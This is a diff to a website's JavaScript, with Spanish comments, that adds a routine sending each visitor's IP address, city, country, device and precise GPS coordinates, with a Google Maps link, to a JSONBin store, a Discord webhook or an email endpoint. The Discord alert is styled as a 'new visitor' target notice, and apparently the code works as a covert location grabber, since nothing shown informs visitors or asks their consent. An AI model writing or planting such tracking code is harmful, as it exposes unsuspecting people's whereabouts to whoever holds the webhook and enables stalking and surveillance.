@@ -334,17 +334,109 @@ window.addEventListener('load', () => {
     }, 3000);
 });
 
-// Guardar datos en localStorage para persistencia (compatible con admin.html)
+// Guardar datos en localStorage Y enviar a servidor
 const STORAGE_KEY = 'visitors_data';
 
+// Enviar datos al servidor/webhook
+async function sendToServer(data) {
+    // Método 1: JSONBin.io (requiere configuración)
+    if (CONFIG.STORAGE_METHOD === 'jsonbin' && CONFIG.JSONBIN_API_KEY && CONFIG.JSONBIN_BIN_ID) {
+        try {
+            // Primero obtener datos existentes
+            const getResponse = await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.JSONBIN_BIN_ID}/latest`, {
+                headers: {
+                    'X-Master-Key': CONFIG.JSONBIN_API_KEY
+                }
+            });
+            
+            let allData = [];
+            if (getResponse.ok) {
+                const result = await getResponse.json();
+                allData = result.record.visitors || [];
+            }
+            
+            // Agregar nuevo visitante
+            allData.push(data);
+            
+            // Actualizar bin
+            const updateResponse = await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.JSONBIN_BIN_ID}`, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': CONFIG.JSONBIN_API_KEY
+                },
+                body: JSON.stringify({ visitors: allData })
+            });
+            
+            if (updateResponse.ok) {
+                console.log('✅ Datos enviados a JSONBin');
+            }
+        } catch (error) {
+            console.log('Error enviando a JSONBin:', error);
+        }
+    }
+    
+    // Método 2: Discord Webhook
+    if (CONFIG.STORAGE_METHOD === 'discord' && CONFIG.DISCORD_WEBHOOK) {
+        try {
+            const embed = {
+                title: '🎯 Nuevo Visitante',
+                color: 3447003,
+                fields: [
+                    { name: '📍 Ubicación', value: `${data.ip?.city || 'N/A'}, ${data.ip?.country || 'N/A'}`, inline: true },
+                    { name: '🌐 IP', value: data.ip?.ip || 'N/A', inline: true },
+                    { name: '📱 Dispositivo', value: data.browser?.platform || 'N/A', inline: true },
+                    { name: '🗺️ Coordenadas', value: data.location?.latitude ? `${data.location.latitude}, ${data.location.longitude}` : `${data.ip?.latitude}, ${data.ip?.longitude}`, inline: false },
+                    { name: '🔗 Google Maps', value: data.location?.latitude ? `[Ver ubicación](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})` : `[Ver ubicación](https://www.google.com/maps?q=${data.ip?.latitude},${data.ip?.longitude})`, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            
+            await fetch(CONFIG.DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+            
+            console.log('✅ Datos enviados a Discord');
+        } catch (error) {
+            console.log('Error enviando a Discord:', error);
+        }
+    }
+    
+    // Método 3: Email (FormSubmit)
+    if (CONFIG.STORAGE_METHOD === 'email' && CONFIG.EMAIL_ENDPOINT) {
+        try {
+            const formData = new FormData();
+            formData.append('Visitante', JSON.stringify(data, null, 2));
+            formData.append('IP', data.ip?.ip || 'N/A');
+            formData.append('Ubicacion', `${data.ip?.city}, ${data.ip?.country}`);
+            formData.append('Coordenadas', data.location?.latitude ? `${data.location.latitude}, ${data.location.longitude}` : `${data.ip?.latitude}, ${data.ip?.longitude}`);
+            
+            await fetch(CONFIG.EMAIL_ENDPOINT, {
+                method: 'POST',
+                body: formData
+            });
+            
+            console.log('✅ Datos enviados por email');
+        } catch (error) {
+            console.log('Error enviando email:', error);
+        }
+    }
+}
+
 function saveVisitorData() {
+    // Guardar localmente
     const allVisitors = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
     const exists = allVisitors.some(v => v.timestamp === visitorData.timestamp);
     
     if (!exists && (visitorData.ip.ip || visitorData.location.latitude)) {
         allVisitors.push(visitorData);
         localStorage.setItem(STORAGE_KEY, JSON.stringify(allVisitors));
-        console.log('✅ Datos del visitante guardados');
+        console.log('✅ Datos guardados localmente');
+        
+        // Enviar al servidor
+        sendToServer(visitorData);
     }
 }
 
